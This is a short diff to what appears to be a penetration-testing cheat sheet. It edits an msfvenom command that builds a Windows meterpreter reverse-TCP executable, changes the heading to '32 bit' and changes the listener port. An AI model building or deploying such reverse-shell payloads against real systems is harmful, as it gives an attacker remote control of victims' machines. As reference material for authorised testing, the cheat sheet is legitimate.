@@ -8,11 +8,11 @@
 msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>
 ```
 
-### Common
+### Common 32 bit
 ```
 myip=127.0.0.1
 
-msfvenom -p windows/meterpreter/reverse_tcp lhost=$myip lport=1234 -f exe -o rev.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=$myip lport=3232 -f exe -o rev.exe
 ```
 
 ### Capture 32 vs 64 bit (exploit/multi/handler)
